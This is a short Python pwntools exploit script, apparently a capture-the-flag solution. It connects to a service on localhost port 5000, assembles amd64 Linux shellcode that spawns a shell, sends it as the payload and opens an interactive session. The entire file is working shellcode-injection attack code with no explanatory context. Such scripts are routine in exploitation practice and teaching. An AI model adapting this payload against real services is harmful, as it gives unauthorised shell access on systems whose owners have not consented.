from pwn import *

# p = process("./chall")
p = remote("localhost", 5000)
context.arch = "amd64"

payload = asm(shellcraft.amd64.linux.sh())

p.send(payload)

p.interactive()